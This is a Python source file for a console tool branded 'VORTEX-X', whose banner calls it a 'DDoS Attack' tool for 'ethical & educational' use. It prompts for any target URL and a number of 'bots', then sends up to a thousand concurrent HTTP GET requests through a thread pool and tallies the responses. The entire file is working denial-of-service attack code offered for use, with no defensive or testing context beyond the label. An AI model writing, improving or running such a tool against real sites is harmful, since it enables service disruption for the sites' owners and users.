import concurrent.futures
import sys
import time
import requests

# Light Gold & Premium ANSI Color Codes
RST = "\033[0m"
BOLD = "\033[1m"
LIGHT_GOLD = "\033[93m"
BRIGHT_GOLD = "\033[38;5;220m"
NEON_PINK = "\033[38;5;201m"
BLOOD_RED = "\033[91m"
DARK_GRAY = "\033[90m"


def print_banner():
  banner = f"""
{LIGHT_GOLD}{BOLD}╔══════════════════════════════════════════╗
║ {BRIGHT_GOLD}      VORTEX-X // STRESS ENGINE         {LIGHT_GOLD}║
╚══════════════════════════════════════════╝
{BRIGHT_GOLD}   [ DDoS Attack - Ethical & Educational ]{RST}
{DARK_GRAY}──────────────────────────────────────────{RST}
"""
  print(banner)


def elite_loader():
  frames = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
  for _ in range(6):
    for frame in frames:
      sys.stdout.write(
          f"\r{LIGHT_GOLD}{BOLD}[⚡] LAUNCHING {frame}{RST}"
      )
      sys.stdout.flush()
      time.sleep(0.05)
  print("\n")


def fire_bot(url, bot_id):
  try:
    headers = {"User-Agent": f"Vortex-{bot_id}"}
    response = requests.get(url, headers=headers, timeout=3)
    return response.status_code
  except requests.exceptions.RequestException:
    return None


def main_console():
  while True:
    print_banner()
    print(f" {LIGHT_GOLD}[1]{RST} {BRIGHT_GOLD}DDoS Attack{RST}")
    print(f" {BLOOD_RED}[2]{RST} {LIGHT_GOLD}Exit{RST}")
    print(f"{DARK_GRAY}──────────────────────────────────────────{RST}")

    choice = input(
        f"{LIGHT_GOLD}{BOLD}VORTEX ❯❯{RST} {BRIGHT_GOLD}Select (1-2): {RST}"
    ).strip()

    if choice == "1":
      print(f"\n{NEON_PINK}--- CONFIG ---{RST}")
      target_url = input(f"{LIGHT_GOLD}Target URL: {RST}").strip()

      if not target_url:
        print(f"{BLOOD_RED}[✖] URL required!{RST}")
        continue

      try:
        bots = int(input(f"{LIGHT_GOLD}Bots (1-1000): {RST}").strip())
        if not (1 <= bots <= 1000):
          print(f"{BLOOD_RED}[✖] Range: 1 to 1000!{RST}")
          continue
      except ValueError:
        print(f"{BLOOD_RED}[✖] Integer only!{RST}")
        continue

      print(
          f"\n{LIGHT_GOLD}[✔] Target: {target_url}\n{LIGHT_GOLD}[✔] Bots:"
          f" {bots}{RST}"
      )

      elite_loader()

      print(f"{LIGHT_GOLD}[⚡] FIRING...\n{RST}")
      success_hits = 0
      failed_hits = 0
      start_time = time.time()

      try:
        with concurrent.futures.ThreadPoolExecutor(
            max_workers=min(bots, 100)
        ) as executor:
          futures = [
              executor.submit(fire_bot, target_url, bot_id)
              for bot_id in range(1, bots + 1)
          ]

          for future in concurrent.futures.as_completed(futures):
            status = future.result()
            if status:
              success_hits += 1
              print(f"{LIGHT_GOLD}[HIT] Status: {status}{RST}")
            else:
              failed_hits += 1
              print(f"{BLOOD_RED}[DROP] Failed{RST}")

      except KeyboardInterrupt:
        print(f"\n{BLOOD_RED}[!] Aborted.{RST}")

      total_time = time.time() - start_time

      print("\n" + "═" * 42)
      print(f"{BRIGHT_GOLD}            REPORT SUMMARY{RST}")
      print("═" * 42)
      print(f" Target   : {target_url}")
      print(f" Bots     : {bots}")
      print(f" Success  : {success_hits}")
      print(f" Failed   : {failed_hits}")
      print(f" Time     : {total_time:.2f}s")
      print("═" * 42)

      input(f"\n{LIGHT_GOLD}Press [Enter] to continue...{RST}")

    elif choice == "2":
      print(f"{BLOOD_RED}[✖] Exiting.{RST}")
      break
    else:
      print(f"{BLOOD_RED}[!] Select 1 or 2.{RST}")


if __name__ == "__main__":
  main_console()
